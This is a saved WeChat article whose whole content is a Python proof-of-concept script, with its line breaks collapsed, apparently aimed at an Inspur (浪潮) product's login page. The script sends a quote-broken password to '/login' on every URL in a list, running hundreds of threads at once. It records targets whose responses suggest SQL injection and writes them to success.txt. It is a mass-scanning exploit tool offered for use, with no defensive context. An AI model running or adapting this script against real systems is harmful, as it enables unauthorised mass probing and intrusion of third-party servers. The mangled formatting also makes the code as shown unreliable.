> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LjwmNsSNNKoGH7Jp4kEwOQ)

import sys,requests,urllib3,threadingurllib3.disable_warnings()lock = threading.Lock()def exp(url):    exp_url = url + '/login'    headers = {        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"    }    poc ={        'op':'login',        'username':'admin',        'password':"pwd'"    }     try:        ret = requests.post(exp_url,headers=headers,data =poc, timeout=10,verify=False)        if 'unexpected EOF' in ret.text:            lock.acquire()            try:                with open('success.txt','a') as f:                    f.write(exp_url+'\n')                    print(url)                lock.release()            except:                lock.release()    except Exception as e:        print(e)        passdef printf():    print('''use: python3 浪潮 v4.0.py url.txt''')if __name__ == "__main__":    thread = []    if len(sys.argv) != 2:        printf()        exit(0)    with open(sys.argv[1]) as f:        for url in f:            url = url.replace('\n','')            if url.find('http') == -1:                url ='http://'+url            t = threading.Thread(target=exp,args=(url,))            thread.append(t)            t.start()            if len(thread) > 800:                for i in thread:                    i.join                thread = []